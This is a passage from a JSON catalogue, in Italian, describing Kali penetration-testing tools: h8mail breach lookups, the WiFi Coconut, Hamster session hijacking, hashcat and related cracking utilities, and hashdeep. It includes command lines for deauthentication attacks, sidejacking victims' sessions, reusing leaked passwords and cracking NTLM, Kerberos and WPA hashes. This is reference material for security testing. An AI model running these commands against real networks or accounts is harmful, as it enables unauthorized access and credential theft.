aggregata:</strong> H8mail interroga simultaneamente molteplici servizi di breach notification e database di leak, aggregando i risultati in un output unificato per ogni indirizzo email cercato. Ogni servizio fornisce informazioni diverse: HIBP indica in quali breach l'email e stata coinvolta, Snusbase e servizi simili possono restituire le password effettivamente esposte, mentre Hunter.io fornisce informazioni sulla validita dell'indirizzo e il dominio aziendale associato. Questa aggregazione multi-sorgente offre un quadro completo dell'esposizione di un indirizzo email.</p><p><strong>Ricerca in database di breach locali:</strong> Oltre alle API remote, H8mail supporta la ricerca in database di breach scaricati localmente, permettendo analisi completamente offline su compilazioni di credenziali. Questa funzionalita e particolarmente utile per analisi su larga scala dove le limitazioni di rate delle API gratuite renderebbero impraticabile l'interrogazione remota, e per scenari dove la privacy delle query e critica e non si vuole rivelare quali indirizzi si stanno cercando a servizi di terze parti.</p><p><strong>Elaborazione batch e output strutturato:</strong> Il tool accetta in input file di testo contenenti liste di indirizzi email, elaborandoli sequenzialmente con gestione automatica del rate limiting delle API. I risultati vengono presentati in formato tabulare a console con colorazione per severita e possono essere esportati in CSV per analisi con spreadsheet o in JSON per integrazione con pipeline automatizzate di threat intelligence. Il formato di output include l'indirizzo cercato, la sorgente del finding, il nome del breach e le credenziali eventualmente recuperate.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>H8mail puo essere utilizzato sia con configurazione minimale (senza API key, usando solo servizi gratuiti) sia con un file di configurazione che contiene le chiavi API per servizi premium che restituiscono risultati piu completi e dettagliati.</p><pre><code># Ricerca singolo indirizzo email (servizi gratuiti)\nh8mail -t target@example.com\n\n# Ricerca con file di configurazione API\nh8mail -t target@example.com -c h8mail_config.ini\n\n# Elaborazione batch da file\nh8mail -t lista_email.txt -c h8mail_config.ini\n\n# Ricerca in database di breach locale\nh8mail -t target@example.com -lb breach_compilation.txt\n\n# Output in formato CSV\nh8mail -t target@example.com -o risultati.csv\n\n# Ricerca con servizio specifico\nh8mail -t target@example.com --hibp YOUR_API_KEY\n\n# Chase mode: usa password trovate per cercare altri account\nh8mail -t target@example.com -c config.ini --chase 3</code></pre><p>Il file di configurazione h8mail_config.ini contiene le chiavi API per i vari servizi nella sezione appropriata. Alcuni servizi come HIBP richiedono abbonamento a pagamento per restituire risultati completi. La chase mode e particolarmente potente perche utilizza le password trovate per cercare altri account che utilizzano le stesse credenziali.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>valutazione dell'esposizione aziendale a data breach</strong>, i team di sicurezza utilizzano H8mail per verificare sistematicamente se gli indirizzi email dei dipendenti compaiono in data breach noti, identificando utenti le cui credenziali potrebbero essere state compromesse e richiedere un cambio password forzato. Questa attivita proattiva riduce il rischio di attacchi basati su credential stuffing e password reuse. In operazioni di <strong>Red Team e password spraying</strong>, H8mail fornisce password reali associate agli account email del target, che possono essere utilizzate per tentativi di accesso su servizi esposti come VPN, webmail, portali aziendali e servizi cloud, sfruttando la tendenza degli utenti a riutilizzare le stesse password su piattaforme diverse. Per <strong>security awareness e formazione</strong>, mostrare ai dipendenti che le loro credenziali sono state effettivamente esposte in data breach pubblici e un potente strumento di sensibilizzazione che motiva l'adozione di password uniche, password manager e autenticazione multi-fattore molto piu efficacemente di presentazioni teoriche sui rischi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le query verso servizi di breach notification vengono registrate dai provider stessi, che potrebbero notificare il proprietario dell'email cercata (come fa HIBP in determinati casi). L'utilizzo di API key collega le ricerche all'account dell'analista. Servizi di threat intelligence possono monitorare e correlare le query per identificare campagne di ricognizione.</p><p><strong>Impatto operativo:</strong> I servizi gratuiti impongono rate limiting stringente che rallenta significativamente le ricerche batch. Le API premium hanno costi che possono essere significativi per ricerche su larga scala. I risultati dei breach possono essere datati e le password potrebbero essere state gia cambiate dal proprietario. La legalita dell'accesso a determinati database di breach varia per giurisdizione.</p><p><strong>Mitigazioni:</strong> Utilizzare H8mail esclusivamente nell'ambito di engagement autorizzati con documentazione scritta dello scope. Gestire le credenziali trovate come dati sensibili con storage cifrato e accesso controllato. Implementare delay appropriati tra le query per rispettare i termini di servizio delle API e evitare blocchi. Non utilizzare le credenziali recuperate per accessi non autorizzati al di fuori dello scope concordato con il cliente.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Email_Harvesting"
    ],
    "notes": null
  },
  {
    "id": "hak5-wifi-coconut",
    "name": "hak5-wifi-coconut",
    "version": "1.1.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/hak5-wifi-coconut/",
    "desc": "Driver e tool per WiFi Coconut Hak5 con 14 radio per cattura simultanea su tutti i canali.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Hak5 WiFi Coconut</strong> e un dispositivo hardware specializzato accompagnato dal relativo pacchetto software di driver e utility, progettato per la cattura simultanea di traffico WiFi su tutti i 14 canali della banda 2.4 GHz. Il dispositivo integra 14 radio WiFi indipendenti basate su chipset RT5370, ciascuna dedicata a un singolo canale, eliminando completamente la necessita di channel hopping che affligge le configurazioni tradizionali con singola interfaccia wireless. Questo approccio garantisce che nessun frame WiFi venga perso durante la cattura, problema intrinseco del channel hopping dove l'interfaccia puo trovarsi su un canale diverso nel momento esatto in cui avviene una trasmissione critica come un handshake WPA. Il pacchetto software incluso in Kali Linux fornisce i driver necessari per gestire le 14 interfacce wireless come entita separate, utility per la configurazione automatizzata della modalita monitor su tutte le radio e integrazione nativa con la suite aircrack-ng e Wireshark. La connessione al sistema host avviene tramite un singolo cavo USB che alimenta e gestisce tutte le 14 radio internamente, semplificando enormemente il setup rispetto a soluzioni con adattatori WiFi multipli separati.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Cattura simultanea su tutti i canali 2.4 GHz:</strong> Con 14 radio indipendenti, il WiFi Coconut monitora contemporaneamente ogni canale della banda 2.4 GHz senza alcun gap temporale di cattura. Questo significa che ogni handshake WPA/WPA2, ogni probe request, ogni deauthentication frame e ogni pacchetto trasmesso su qualsiasi canale viene catturato in tempo reale. Per attivita di wireless security assessment, questa capacita elimina il fattore fortuna associato al channel hopping, dove la cattura di un handshake dipende dalla coincidenza di trovarsi sul canale giusto al momento giusto.</p><p><strong>Integrazione nativa con aircrack-ng e Wireshark:</strong> Le 14 interfacce wireless vengono esposte al sistema operativo come dispositivi di rete indipendenti (wlan0 attraverso wlan13), ognuna configurabile in monitor mode tramite le utility standard airmon-ng. Questo permette di utilizzare airodump-ng per il monitoraggio multicanale, aireplay-ng per injection mirata su canali specifici e Wireshark per analisi dettagliata dei pacchetti, il tutto senza modifiche ai workflow esistenti degli analisti wireless.</p><p><strong>Setup semplificato con singola connessione USB:</strong> Nonostante integri 14 radio indipendenti, il WiFi Coconut si connette al sistema host tramite un singolo cavo USB che fornisce sia alimentazione sia comunicazione dati per tutte le radio. L'utility wifi_coconut automatizza la configurazione iniziale, attivando la modalita monitor su tutte le interfacce e assegnando ciascuna al canale appropriato con un singolo comando. Questo riduce drasticamente il tempo di setup rispetto a configurazioni equivalenti con 14 adattatori USB separati.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Il WiFi Coconut richiede il pacchetto driver installato in Kali Linux e sufficiente banda USB per gestire 14 interfacce wireless simultaneamente. E consigliabile utilizzare una porta USB 3.0 per garantire banda adeguata.</p><pre><code># Verifica che il dispositivo sia riconosciuto\nlsusb | grep -i ralink\n\n# Verifica stato del dispositivo e delle radio\nwifi_coconut status\n\n# Setup automatico: attiva monitor mode su tutte le 14 radio\nsudo wifi_coconut setup\n\n# Verifica le interfacce create\niwconfig\n\n# Cattura simultanea su tutti i canali con airodump-ng\nsudo airodump-ng wlan0mon wlan1mon wlan2mon wlan3mon wlan4mon wlan5mon wlan6mon\n\n# Cattura su canale specifico con interfaccia dedicata\nsudo airodump-ng --channel 6 wlan5mon\n\n# Cattura completa con Wireshark su tutte le interfacce\nsudo wireshark -i wlan0mon -i wlan1mon -i wlan2mon ...\n\n# Deauthentication attack su canale specifico mentre si cattura su tutti\nsudo aireplay-ng --deauth 5 -a [BSSID_TARGET] wlan5mon</code></pre><p>Per catture prolungate, monitorare l'utilizzo della CPU e dello spazio disco poiche 14 interfacce in cattura simultanea generano un volume significativo di dati. Un hub USB alimentato puo essere necessario se la porta USB del laptop non fornisce corrente sufficiente per tutte le radio.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante <strong>wireless security assessment e penetration testing WiFi</strong>, il WiFi Coconut garantisce la cattura di ogni handshake WPA/WPA2 trasmesso nell'area, indipendentemente dal canale utilizzato dalla rete target. Questo e particolarmente critico in ambienti con molte reti su canali diversi o quando il target utilizza canali meno comuni dove un singolo adattatore in channel hopping trascorrerebbe poco tempo. Per <strong>wireless survey e analisi dello spettro RF</strong>, la cattura simultanea su tutti i canali permette di mappare completamente l'ambiente wireless, identificando tutte le reti attive, i dispositivi client, le sovrapposizioni di canale e le interferenze, fornendo un quadro completo per la pianificazione di reti WiFi sicure ed efficienti. In contesti di <strong>incident response wireless e threat hunting</strong>, il WiFi Coconut permette di monitorare in tempo reale tutto il traffico WiFi 2.4 GHz nell'area per identificare access point rogue, evil twin attacks, dispositivi non autorizzati e attivita di deauthentication, senza il rischio di perdere eventi critici a causa del channel hopping.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le 14 radio in monitor mode sono passive e non trasmettono, rendendole invisibili ai sistemi WIDS/WIPS durante la sola cattura. Tuttavia, qualsiasi operazione di injection (deauth, fake beacon) tramite una delle interfacce e rilevabile dai sistemi di monitoraggio wireless. Il dispositivo fisico e riconoscibile e la sua presenza puo essere notata in ambienti con sorveglianza fisica o controllo degli accessi.</p><p><strong>Impatto operativo:</strong> Il WiFi Coconut opera esclusivamente sulla banda 2.4 GHz e non cattura traffico 5 GHz o 6 GHz (WiFi 6E), limitando la copertura in ambienti moderni dove molte reti utilizzano bande superiori. Il dispositivo richiede hardware dedicato (circa 100 USD) e la sua disponibilita limitata puo essere un vincolo logistico. Il consumo energetico di 14 radio puo causare problemi di alimentazione USB su alcuni laptop.</p><p><strong>Mitigazioni:</strong> Utilizzare il dispositivo in modalita puramente passiva (solo cattura) durante le fasi di ricognizione per rimanere invisibili. Complementare con adattatori 5 GHz per copertura completa dello spettro WiFi. Posizionare il dispositivo in modo discreto e utilizzare prolunghe USB se necessario per distanziarlo dal laptop dell'operatore. Conservare e gestire le catture contenenti traffico di rete di terzi in conformita con le leggi locali sulla privacy e l'intercettazione delle comunicazioni.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "hamster-sidejack",
    "name": "hamster-sidejack",
    "version": "2.0",
    "icon": "../app/icons/hamster-sidejack-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/hamster-sidejack/",
    "desc": "Tool per session hijacking che usa cookie catturati da ferret per impersonare utenti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Hamster</strong> e un tool di session hijacking che opera come proxy HTTP locale, progettato per sfruttare cookie di sessione catturati dal traffico di rete per impersonare le sessioni web delle vittime. Sviluppato originariamente da Robert Graham come companion tool di Ferret, Hamster fu presentato insieme al concetto di \"sidejacking\" alla conferenza BlackHat nel 2007, dimostrando quanto fosse semplice dirottare sessioni web su reti WiFi aperte. Il tool intercetta i cookie di sessione catturati da Ferret (o estratti da catture pcap) e li presenta attraverso un'interfaccia web locale dove l'operatore puo selezionare la sessione di una vittima e navigare nei siti web come se fosse autenticato con le credenziali della vittima. Sebbene Hamster sia oggi considerato un tool storico con utilita limitata nell'era dell'HTTPS ubiquo, rimane rilevante come strumento didattico per comprendere i meccanismi fondamentali del session hijacking e l'importanza della cifratura del trasporto. Il tool ha avuto un ruolo significativo nella storia della sicurezza web, contribuendo ad accelerare l'adozione di HTTPS su larga scala dopo che tool come Firesheep (ispirato al concetto di Hamster) resero il sidejacking accessibile a chiunque.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Proxy HTTP per session replay:</strong> Hamster crea un server proxy HTTP locale (tipicamente sulla porta 1234) attraverso il quale l'operatore naviga il web utilizzando i cookie di sessione catturati dalla vittima. Il proxy intercetta le richieste HTTP in uscita e inietta automaticamente i cookie della sessione selezionata, permettendo di accedere ai siti web come se si fosse autenticati con l'account della vittima. Questo meccanismo non richiede la conoscenza della password dell'utente, sfruttando direttamente il token di sessione valido.</p><p><strong>Integrazione con Ferret per cattura cookie:</strong> Hamster lavora in tandem con Ferret, un tool di cattura pacchetti specializzato nell'estrazione di cookie HTTP dal traffico di rete. Ferret opera in modalita promiscua sull'interfaccia di rete, catturando i cookie trasmessi in chiaro nelle richieste HTTP di tutti i dispositivi sulla stessa rete locale. I cookie estratti vengono salvati in un formato leggibile da Hamster che li organizza per indirizzo IP della vittima e sito web di destinazione.</p><p><strong>Interfaccia web per selezione sessioni:</strong> Accedendo all'interfaccia web di Hamster (http://hamster nel browser configurato col proxy), l'operatore visualizza una lista di tutte le sessioni catturate organizzate per indirizzo IP della vittima. Per ogni vittima sono elencati i siti web per i quali sono disponibili cookie di sessione validi. Con un click, l'operatore puo selezionare una sessione e iniziare a navigare il sito come la vittima, visualizzando il suo profilo, i messaggi, le impostazioni e qualsiasi dato accessibile con quella sessione autenticata.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>L'utilizzo di Hamster richiede una posizione di rete che permetta la cattura del traffico HTTP non cifrato, tipicamente sulla stessa rete WiFi della vittima o attraverso un attacco MITM precedentemente stabilito. Lo scenario classico prevede l'uso congiunto di Ferret per la cattura e Hamster per lo sfruttamento.</p><pre><code># Fase 1: Cattura cookie con Ferret sulla rete locale\nsudo ferret -i eth0\n# oppure su interfaccia wireless\nsudo ferret -i wlan0mon\n\n# Fase 2: Avvia il proxy Hamster\nhamster\n# Output: proxy avviato su porta 1234\n\n# Fase 3: Configura il browser per usare il proxy\n# Proxy HTTP: 127.0.0.1 porta 1234\n\n# Fase 4: Accedi all'interfaccia di selezione sessioni\n# Naviga su http://hamster nel browser\n\n# Fase 5: Seleziona la vittima dalla lista di IP\n# Click sull'IP della vittima target\n\n# Fase 6: Seleziona il sito web desiderato\n# Click sul sito per cui sono disponibili cookie\n# Il browser carica il sito con la sessione della vittima</code></pre><p>E importante notare che Hamster funziona esclusivamente con sessioni HTTP non cifrate. Qualsiasi sito che utilizza HTTPS (che oggi rappresenta la stragrande maggioranza del web) non e vulnerabile a questo tipo di attacco a meno che non sia stato eseguito un SSL stripping preventivo.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Come <strong>strumento didattico e di security awareness</strong>, Hamster rimane uno degli strumenti piu efficaci per dimostrare visivamente i rischi delle connessioni HTTP non cifrate e delle reti WiFi aperte. La semplicita con cui un operatore puo impersonare le sessioni web delle vittime ha un impatto immediato sulla comprensione dei rischi da parte di pubblico non tecnico e management, motivando l'investimento in HTTPS e VPN aziendali. In scenari di <strong>penetration testing su reti legacy</strong>, Hamster puo ancora trovare applicazione in ambienti con applicazioni web interne che utilizzano HTTP non cifrato, portali di dispositivi embedded (stampanti, telecamere IP, router) con interfacce web senza TLS e sistemi legacy che non supportano HTTPS. Questi scenari sono piu comuni di quanto si pensi in reti aziendali che ospitano dispositivi IoT e sistemi industriali. Per <strong>validazione dell'implementazione HTTPS</strong>, tentare il sidejacking con Hamster su un'applicazione web e un test pratico per verificare che HTTPS sia correttamente implementato con flag Secure sui cookie, HSTS headers e redirect automatico da HTTP a HTTPS, confermando che il session hijacking via sniffing non sia possibile.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> La fase di cattura con Ferret richiede l'interfaccia in modalita promiscua, rilevabile su reti cablate con switch che supportano port security o detection di promiscuous mode. Su reti WiFi, la cattura passiva non e rilevabile, ma eventuali attacchi ARP spoofing o MITM necessari per intercettare traffico su reti switched generano anomalie rilevabili da sistemi NAC e IDS. Il traffico HTTP riprodotto dal proxy Hamster proviene dall'IP dell'attaccante, non della vittima, creando anomalie nei log dei server web.</p><p><strong>Impatto operativo:</strong> L'efficacia del tool e drasticamente limitata nell'era moderna dove HTTPS e ubiquo. La maggior parte dei siti web principali utilizza HTTPS con HSTS, rendendo impossibile il sidejacking senza SSL stripping preliminare. I cookie di sessione con flag Secure non vengono mai trasmessi su HTTP. I browser moderni segnalano attivamente i siti HTTP come \"non sicuri\", riducendo ulteriormente la superficie di attacco.</p><p><strong>Mitigazioni:</strong> Utilizzare Hamster esclusivamente in ambienti di test autorizzati e controllati. Combinare con ARP spoofing o MITM solo con autorizzazione esplicita e documentata. Documentare le sessioni compromesse come evidenza per il report di penetration test. Essere consapevoli che l'impersonazione di sessioni altrui costituisce un reato in molte giurisdizioni se effettuata senza autorizzazione.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Proxy_MITM"
    ],
    "notes": null
  },
  {
    "id": "hash-identifier",
    "name": "hash-identifier",
    "version": "1.2",
    "icon": "../app/icons/hash-identifier-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/hash-identifier/",
    "desc": "Identifica il tipo di algoritmo hash analizzando formato e lunghezza del digest.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Hash-identifier</strong> e un tool Python per identificare il tipo di algoritmo crittografico utilizzato per generare un dato hash. Analizza formato, lunghezza e pattern del digest per restituire una lista ordinata di possibili algoritmi. Utile nelle fasi iniziali del password cracking quando si recuperano hash da database o dump di credenziali. Supporta MD5, SHA-1, SHA-256, NTLM, bcrypt e molti altri formati comuni.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Riconoscimento automatico del formato:</strong> Analizza lunghezza in caratteri e charset del digest per determinare corrispondenze. Un hash di 32 caratteri hex viene associato a MD5 o NTLM, 64 caratteri a SHA-256. Riconosce anche prefissi speciali come <code>$2a$</code> per bcrypt o <code>$6$</code> per SHA-512 crypt.</p><p><strong>Classificazione multipla con priorita:</strong> Presenta una lista di possibili algoritmi ordinati per probabilita. Molti formati hash condividono la stessa lunghezza, rendendo impossibile un'identificazione univoca. L'utente prova gli algoritmi suggeriti in ordine durante il cracking.</p><p><strong>Supporto formati esteso:</strong> Gestisce hash con e senza salt, formati con prefisso di CMS come WordPress e Joomla, e hash di sistema operativo come LM, NTLM e crypt variants.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Si avvia in modalita interattiva e richiede l'inserimento dell'hash da analizzare.</p><pre><code># Avvia hash-identifier\nhash-identifier\n\n# Inserisci hash MD5 al prompt\nENTER HASH: 5d41402abc4b2a76b9719d911017c592\n# Output: Possible Hashs: MD5, MD4\n\n# Hash bcrypt\nENTER HASH: $2a$10$N9qo8uLOickgx2ZMRZoMye...\n# Output: Possible Hashs: bcrypt</code></pre><p>Dopo l'identificazione, usare il parametro <code>-m</code> corretto in hashcat per il cracking.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nel <strong>password cracking</strong>, identifica rapidamente hash estratti da SQL injection o dump NTDS.dit per configurare hashcat. Nelle <strong>CTF</strong>, accelera il riconoscimento di hash nelle challenge. Nella <strong>forensics</strong>, analizza hash trovati in malware o artefatti di rete.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Opera esclusivamente in locale senza traffico di rete, invisibile a sistemi di monitoraggio.</p><p><strong>Impatto operativo:</strong> Fornisce suggerimenti probabilistici, non certezze. Per identificazione piu accurata con 220+ algoritmi e suggerimento moduli hashcat, usare hashid come alternativa.</p><p><strong>Mitigazioni:</strong> Non esfiltrare hash verso servizi online di identificazione, preferire sempre tool locali per mantenere riservatezza dei dati.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Cracking"
    ],
    "notes": null
  },
  {
    "id": "hashcat-utils",
    "name": "hashcat-utils",
    "version": "1.9",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/hashcat-utils/",
    "desc": "Utility per hashcat: conversione capture, rule generation, wordlist manipulation.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Hashcat-utils</strong> e una collezione di utility di supporto per ottimizzare il workflow di password cracking con hashcat. Include strumenti per conversione di capture WiFi, generazione e manipolazione di wordlist, combinazione di dizionari e processamento di regole. Coprono tutte le fasi preparatorie che precedono il cracking vero e proprio, dalla cattura iniziale alla generazione di candidati password. Essenziale per chiunque utilizzi hashcat professionalmente.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Conversione formati capture:</strong> <code>cap2hccapx</code> converte file .cap e .pcap nel formato .hccapx nativo di hashcat per cracking WPA/WPA2. Valida anche la qualita del capture segnalando handshake incompleti o corrotti.</p><p><strong>Combinazione e generazione wordlist:</strong> <code>combinator</code> genera tutte le combinazioni tra due wordlist, efficace contro password composte da due parole. <code>Maskprocessor</code> genera wordlist da pattern di mask per esplorare password con struttura nota.</p><p><strong>Preprocessing e regole:</strong> <code>Splitlen</code> divide wordlist per lunghezza. <code>Rli</code> rimuove entry duplicate e gia craccate. Questi tool riducono drasticamente il tempo di cracking eliminando lavoro ridondante.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Le utility si usano come fase preparatoria prima di avviare hashcat.</p><pre><code># Converti capture WiFi\ncap2hccapx capture.cap output.hccapx\n\n# Combina due wordlist\ncombinator wordlist1.txt wordlist2.txt > combined.txt\n\n# Genera da mask (4 lettere minuscole)\nmaskprocessor ?l?l?l?l > 4chars.txt\n\n# Dividi per lunghezza\nsplitlen 8 wordlist.txt\n\n# Rimuovi password gia craccate\nrli wordlist.txt cracked.txt > remaining.txt</code></pre><p>Workflow: acquisizione hash, conversione formato, preparazione wordlist, lancio hashcat.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nel <strong>WiFi pentesting</strong>, conversione capture in formato hashcat per cracking su GPU. Nel <strong>password cracking professionale</strong>, costruzione di pipeline con maskprocessor e combinator per massimizzare il successo. Nella <strong>ricerca sulla sicurezza password</strong>, analisi di pattern e distribuzioni nelle wordlist da breach pubblici.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Operano localmente senza traffico di rete. Nessuna interazione con sistemi target.</p><p><strong>Impatto operativo:</strong> La qualita del preprocessing determina l'efficacia del cracking. Verificare sempre la validita dei file convertiti prima di sessioni lunghe.</p><p><strong>Mitigazioni:</strong> Mantenere hash e wordlist su volumi cifrati. Cancellare in modo sicuro file temporanei contenenti password in chiaro.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Cracking"
    ],
    "notes": null
  },
  {
    "id": "hashcat",
    "name": "hashcat",
    "version": "6.2.6",
    "icon": "../app/icons/hashcat-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/hashcat/",
    "desc": "Password cracker GPU più veloce al mondo con supporto per 350+ tipi di hash e regole.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Hashcat</strong> è il password cracker più veloce al mondo, sfruttando GPU per performance estreme. Supporta oltre 350 tipi di hash, attack modes multipli (dictionary, brute-force, combinator, rule-based, mask) e regole per manipolazione password. Standard de facto per password cracking professionale.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>GPU Acceleration:</strong> Sfrutta CUDA/OpenCL per velocità massima.</p><p><strong>350+ Hash Types:</strong> MD5, SHA, bcrypt, WPA, NTLM, Kerberos, etc.</p><p><strong>Attack Modes:</strong> Dictionary, brute-force, combination, hybrid, mask.</p><p><strong>Rules Engine:</strong> Regole potenti per mutazione password.</p><p><strong>Distributed:</strong> Supporta cracking distribuito.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Dictionary + rules per massima coverage NTLM\nhashcat -m 1000 ntlm_hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule \\\n  -r /usr/share/hashcat/rules/toggles1.rule --force -O\n\n# Mask attack: Company + Anno + Simbolo (Corporate passwords)\nhashcat -m 1000 hashes.txt -a 3 'Company?d?d?d?d?s' --increment --increment-min 10\n\n# Combinator: due wordlist concatenate\nhashcat -m 0 hashes.txt -a 1 wordlist1.txt wordlist2.txt\n\n# Kerberoast con ottimizzazione GPU\nhashcat -m 13100 kerberoast.txt wordlist.txt -O -w 3 --hwmon-temp-abort=90\n\n# WPA/WPA2 PMKID con session restore\nhashcat -m 22000 capture.hc22000 wordlist.txt --session=wifi_crack\nhashcat --restore --session=wifi_crack  # riprendi dopo interruzione\n\n# AS-REP Roasting\nhashcat -m 18200 asrep_hashes.txt wordlist.txt -r rules/InsidePro-PasswordsPro.rule\n\n# Hybrid: wordlist + mask suffix\nhashcat -m 1000 hashes.txt -a 6 wordlist.txt '?d?d?d?s'\n\n# Show cracked passwords\nhashcat -m 1000 hashes.txt wordlist.txt --show --outfile-format=2</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Password Cracking</strong>, cracka qualsiasi tipo di hash.</p><p>Nel <strong>Pentest</strong>, verifica strength delle password.</p><p><strong>WiFi Cracking</strong> per handshake WPA/WPA2.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Local Only:</strong> Cracking avviene localmente, nessun traffico di rete. Richiede GPU potente per performance ottimali. Cloud GPU disponibili per hash complessi.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Cracking"
    ],
    "notes": null
  },
  {
    "id": "hashdeep",
    "name": "hashdeep",
    "version": "4.4",
    "icon": "../app/icons/hashdeep-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/hashdeep/",
    "desc": "Calcola hash ricorsivamente e verifica integrità file con audit mode per forensics.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Hashdeep</strong> e uno strumento forense per il calcolo ricorsivo di hash crittografici su directory e la verifica dell'integrita dei file tramite confronto con baseline. Supporta MD5, SHA-1, SHA-256, Tiger e Whirlpool simultaneamente in un singolo passaggio. La funzionalita principale e l'audit mode che confronta lo stato attuale con una baseline, identificando file modificati, aggiunti, rimossi o spostati. Parte del toolkit standard della digital forensics per garantire la catena di custodia.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Hashing ricorsivo multi-algoritmo:</strong> Attraversa ricorsivamente directory calcolando hash multipli per ogni file. La doppia verifica con piu algoritmi riduce a zero la possibilita di collisioni. Output in formato CSV facilmente parsabile con percorso, dimensione e hash.</p><p><strong>Audit mode per integrita:</strong> Confronta il filesystem con baseline generata precedentemente. Identifica file modificati, aggiunti, rimossi e spostati. Critico nelle indagini forensi per dimostrare l'integrita delle evidenze.</p><p><strong>Modalita matching:</strong> Cerca file con hash specifici in una directory. Supporta positive matching (trova file noti) e negative matching (trova file NON nella lista), utile per individuare malware o file sospetti.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Generare baseline all'acquisizione, poi verificare con audit mode.</p><pre><code># Genera baseline MD5+SHA-256\nhashdeep -r -c md5,sha256 /path/to/evidence/ > baseline.txt\n\n# Verifica integrita (audit mode)\nhashdeep -r -a -k baseline.txt /path/to/evidence/\n\n# Cerca file con hash noti (malware)\nhashdeep -r -m -k known_malware.txt /suspect/\n\n# Negative matching: file NON nella lista nota\nhashdeep -r -x -k known_good.txt /suspect/\n\n# Progress bar per volumi grandi\nhashdeep -r -e -c sha256 /large/volume/</code></pre><p>Il flag <code>-e</code> mostra la stima del tempo rimanente per volumi di grandi dimensioni.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nella <strong>digital forensics</strong>, garantisce la catena di custodia calcolando hash all'acquisizione e verificandoli prima della presentazione. Nell'<strong>incident response</strong>, il negative matching identifica file sconosciuti confrontando con baseline legittima. Per <strong>compliance</strong>, monitora integrita di file di sistema e configurazioni critiche.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Opera in sola lettura senza modificare file. Il carico I/O su grandi volumi potrebbe essere rilevabile da monitoraggio prestazioni.</p><p><strong>Impatto operativo:</strong> Generare baseline il prima possibile dopo acquisizione evidenze. Su volumi grandi il calcolo richiede tempo significativo. Algoritmi multipli aumentano tempo ma riducono falsi positivi.</p><p><strong>Mitigazioni:</strong> Conservare baseline su supporti write-protected separati dalle evidenze. In contesti giudiziari usare almeno due algoritmi indipendenti.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Disk_Analysis"
    ],
    "notes": null
  },
  {
    "id": "hashid",
    "name": "hashid",
    "version": "3.1.4",
    "icon": "../app/icons/hashid-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/hashid/",
    "desc": "Identifica oltre 220 tipi di hash e suggerisce il modulo hashcat corrispondente.",
